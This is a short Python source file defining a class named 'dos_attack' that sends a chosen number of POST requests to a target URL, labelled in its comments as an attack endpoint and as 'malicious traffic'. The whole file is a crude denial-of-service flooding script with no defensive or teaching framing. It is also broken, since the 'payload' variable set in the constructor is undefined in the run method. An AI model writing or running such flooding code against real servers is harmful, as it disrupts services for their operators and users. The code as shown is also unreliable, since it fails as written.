#Dependency - requests
import requests

class dos_attack:
    def __init__(self, url, i):
        self.url = url                              # Attack endpoint
        self.i = i                                  # Number of requests to send
        payload = {'msg': 'malicious traffic'}      # Payload for http message and visibility server-side

    def run(self):
        for j in range(self.i):
            response = requests.post(self.url, data=payload)
